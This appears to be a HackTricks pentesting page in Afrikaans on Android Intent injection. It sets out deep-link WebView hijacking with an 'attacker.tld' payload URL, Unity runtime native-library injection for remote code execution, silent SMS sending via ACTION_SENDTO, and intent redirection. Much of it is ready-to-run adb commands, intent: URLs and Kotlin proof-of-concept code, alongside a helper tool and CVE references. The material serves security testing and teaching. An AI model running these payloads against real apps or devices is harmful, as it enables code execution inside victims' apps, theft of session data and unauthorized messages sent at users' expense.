# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection misbruik komponente wat deur die aanvaller beheerde Intents of data aanvaar wat later in Intents omskep word. Twee baie algemene patrone tydens Android app pentests is:

- Deur die aanvaller vervaardigde extras aan exported Activities/Services/BroadcastReceivers stuur wat later na geprivilegieerde, non-exported komponente deurgegee word.
- Aktiveer exported VIEW/BROWSABLE deep links wat deur die aanvaller beheerde URLs na interne WebViews of ander sensitiewe sinks stuur.

## Deep links → WebView sink (URL parameter injection)

As 'n app 'n pasgemaakte skema deep link blootstel soos:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
en indien die ontvangende Activity die `url`-queryparameter na 'n WebView deurstuur, kan jy die app dwing om arbitrêre afgeleë inhoud in sy eie WebView-konteks te laai en te vertoon.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impak
- HTML/JS word binne die app se WebView-profiel uitgevoer.
- As JavaScript geaktiveer is (standaard of as gevolg van verkeerd-gedreigde kontroles), kan jy enige blootgestelde `@JavascriptInterface`-objekte opspoor of gebruik, WebView-cookies/lokale berging steel, en pivot.

Sien ook:

{{#ref}}
webview-attacks.md
{{#endref}}

## Volgorde-van-kontroles fout wat JavaScript aktiveer

’n Terugkerende fout is om JavaScript (of ander permissiewe WebView-instellings) te aktiveer voordat die finale URL-toegangslys/verifikasie voltooi is. As vroeë helpers jou deep link aanvaar en die WebView eers gekonfigureer word, gebeur jou finale laai met JavaScript reeds geaktiveer, selfs al is later kontroles foutief of te laat.

Waar om te kyk in gedecompileerde kode:
- Meervoudige helpers wat die URL op verskillende maniere ontleed/skei/herbou (inkonsekwente normalisering).
- Oproepe na `getSettings().setJavaScriptEnabled(true)` voor die laaste host/pad toegangslyskontrole.
- ’n pyplyn soos: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → voor-init native biblioteek-inspuiting (RCE)

Unity-gebaseerde Android-apps gebruik gewoonlik `com.unity3d.player.UnityPlayerActivity` (of `UnityPlayerGameActivity`) as die entry Activity. Unity se Android-sjabloon hanteer ’n spesiale Intent extra genaamd `unity` as ’n string van opdragreël-vlae vir die Unity runtime. Wanneer die entry Activity geëksporteer is (standaard in baie sjablone), kan enige plaaslike app – en soms ’n webwerf as `BROWSABLE` teenwoordig is – hierdie extra voorsien.

’n Gevaarlike, ongedokumenteerde vlag lei tot native kode-uitvoering tydens baie vroeë proses-initiëring:

- Verborge vlag: `-xrsdk-pre-init-library <absolute-path>`
- Effek: `dlopen(<absolute-path>, RTLD_NOW)` baie vroeg in init, laai aanvaller-beheerde ELF binne die teiken-app se proses met sy UID en toestemmings.

Omgekeerde-ingenieursuittreksel (vereenvoudig):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Hoekom dit werk
- Die Intent-extra `unity` word geparseer na Unity runtime-vlags.
- Deur die pre-init vlag te voorsien wys dit Unity na 'n ELF-pad wat deur die aanvaller beheer word binne 'n toegelate linker namespace path (sien beperkings hieronder).

Voorwaardes vir uitbuiting
- Die Unity entry Activity is exported (gewoonlik standaard waar).
- Vir een-klik op afstand via die blaaier: die entry Activity verklaar ook `android.intent.category.BROWSABLE` sodat extras vanaf 'n `intent:` URL deurgegee kan word.

Lokale uitbuiting (dieselfde toestel)
1) Plaas 'n payload ELF op 'n pad wat deur die slagoffer-app gelees kan word. Maklikste: sluit 'n kwaadwillige biblioteek in jou eie aanvaller-app in en verseker dat dit uitgepak word onder `/data/app/.../lib/<abi>/` deur dit in die aanvaller se manifest te stel:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Begin die slagoffer se Unity-aktiwiteit met die CLI pre-init vlag in die `unity` extra. Voorbeeld ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; jou payload word in die slagoffer-proses uitgevoer en erf al sy app-toestemmings (kamera/mik/netwerk/berging, ens.) en toegang tot in-app sessies/data.

Aantekeninge
- Die presiese `/data/app/...` pad verskil oor toestelle/installasies. 'n aanvallers-app kan sy eie native lib dir tydens runtime opvra via `getApplicationInfo().nativeLibraryDir` en dit aan die trigger kommunikeer.
- Die lêer hoef nie met `.so` te eindig nie as dit 'n geldige ELF is – `dlopen()` kyk na die ELF headers, nie na uitbreidinge nie.

Afstands-een‑klik via blaaier (voorwaardelik)
As die Unity entry activity met `BROWSABLE` geexporteer is, kan 'n webwerf extras via 'n `intent:` URL deurgee:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Tog, op moderne Android blokkeer die dynamic linker namespaces en SELinux die laai vanaf baie openbare paaie (bv. `/sdcard/Download`). Jy sal foute sien soos:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Omseilingsstrategie: rig op apps wat deur die aanvaller beheerde bytes in hul privaat stoorplek cache (bv. HTTP-caches). Omdat toegelate paaie `/data` en die app’s privaat gids insluit, kan die deur `-xrsdk-pre-init-library` na 'n absolute pad binne die app se cache te wys die linker-vereistes bevredig en kode-uitvoering lewer. Dit weerspieël vorige cache-to-ELF RCE-patrone wat in ander Android-apps ervaar is.


## Confused‑Deputy: Silent SMS/MMS via ACTION_SENDTO (Wear OS Google Messages)

Sommige standaard-berigtoepassings voer implisiete boodskap-intents verkeerdelik outomaties uit en verander dit in 'n confused‑deputy-primitive: enige onprivilegieerde app kan `Intent.ACTION_SENDTO` met `sms:`, `smsto:`, `mms:`, of `mmsto:` aktiveer en 'n onmiddellike stuur veroorsaak sonder 'n bevestigings-UI en sonder die `SEND_SMS` toestemming.

Belangrike punte
- Trigger: implisiete `ACTION_SENDTO` + boodskap-URI-skema.
- Data: stel ontvanger in die URI, boodskapteks in die "sms_body" extra.
- Permissies: geen (geen `SEND_SMS`), vertrou op die standaard SMS/MMS-behandelaar.
- Waargeneem: Google Messages for Wear OS (gerepareer in Mei 2025). Ander handelaars moet soortgelyk geëvalueer word.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (geen spesiale toestemmings nodig)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Uitbreiding van aanvalsvlak (Wear OS)
- Enige komponent wat Activities kan begin, kan dieselfde payload afvuur: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- As die standaardhandler outo‑stuur, kan misbruik een‑raak wees of heeltemal stil vanaf agtergrondkontekste, afhangend van OEM‑beleide.

Pentest checklist
- Los `ACTION_SENDTO` op op die teiken om die standaardhandler te identifiseer; verifieer of dit 'n samestel‑UI wys of stil stuur.
- Toets al vier skemas (`sms:`, `smsto:`, `mms:`, `mmsto:`) en extras (`sms_body`, opsioneel `subject` vir MMS) om gedragverskille te kontroleer.
- Neem betaalde bestemmings/premium‑tarief nommers in ag wanneer op regte toestelle getoets word.


## Ander klassieke Intent injection primitives

- startActivity/sendBroadcast wat aanvallers-verskafde `Intent` extras gebruik wat later herontleed word (`Intent.parseUri(...)`) en uitgevoer word.
- Geëksporteerde proxy‑komponente wat Intents deurstuur na nie‑geëksporteerde sensitiewe komponente sonder permisiekontroles.

---

## Outomatisering van exported-component toetsing (Smali-driven ADB generation)

Wanneer exported‑komponente spesifieke extras verwag, lei raaiwerk oor payload‑struktuur tot tydsverlies en vals‑negatiewe. Jy kan die ontdekking van sleutels/tipe direk uit Smali outomatiseer en gereed‑om‑te‑hardloop adb‑opdragte genereer.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Benadering: dekompileer en skandeer Smali vir oproepe soos `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` om af te lei watter extras en velde deur elke komponent verbruik word.
- Uitset: vir elke exported Activity/Service/Receiver/Provider, druk die tool 'n kort verduideliking en die eksakte `adb shell am ...`/`cmd content ...` opdrag met korrek getipeerde vlae.

Installeer
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Gebruik
```bash
python apk-components-inspector.py target.apk
```
Voorbeeld uitset
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras kortlys (tipe-bewuste vlae)
- Stringe: `--es key value` | String-reeks: `--esa key v1,v2`
- Geheelgetalle: `--ei key 123` | Geheelgetal-reeks: `--eia key 1,2,3`
- Booleane: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Algemene vlae: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro-wenke vir Providers
- Gebruik `adb shell cmd content query|insert|update|delete ...` om ContentProviders sonder agents aan te spreek.
- Vir SQLi-proewe, varieer `--projection` en `--where` (aka selection) wanneer die onderliggende provider op SQLite gebaseer is.

Volledige pyplyn-outomatisering (interaktiewe uitvoerder)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Hulpskrip om adb-opdragte te ontleed en uit te voer</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Run on-device: die inspector is Python-gebaseerd en werk in Termux of op gerooide telefone waar `apktool`/`androguard` beskikbaar is.

---

## Intent Redirection (CWE-926) – vind en benut

Pattern
- 'n Uitgevoerde invoerpunt (Activity/Service/Receiver) lees 'n inkomende Intent en stuur dit intern of eksternt deur sonder om die bron/data te valideer, byvoorbeeld:
- `startActivity(getIntent())`
- `startActivity(intent)` waar `intent` van 'n extra gekom het soos `redirect_intent`/`next_intent`/`pending_intent` of `Intent.parseUri(...)`.
- Vertrou op `action`/`data`/`component` velde sonder kontrole; verifieer nie die aanroeper se identiteit nie.

What to search in Smali/Java
- Gebruik van `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Direkte `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` op attacker-influenced Intents.
- Gebrek aan `getCallingPackage()`/`getCallingActivity()` kontroles of aangepaste permissiehekke.

ADB PoC-sjablone
- Proxy Activity wat 'n extra Intent na 'n bevoorregte interne Activity deurstuur:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Exported Service wat 'n `redirect_intent` parcelable respekteer:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver wat herlei sonder verifikasie:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags wat nuttig is vir singleTask-stylgedrag
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Werklike wêreldvoorbeelde (impak wissel):
- CVE-2024-26131 (Element Android): geëksporteerde flows wat lei tot WebView-manipulasie, PIN-omseiling, login hijack.
- CVE-2023-44121 (LG ThinQ Service): geëksporteerde receiver-aksie `com.lge.lms.things.notification.ACTION` → stelselvlak-effekte.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): omleiding → arbitrêre lêertoegang (met gebruikersinteraksie).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): impliciete Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## References

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
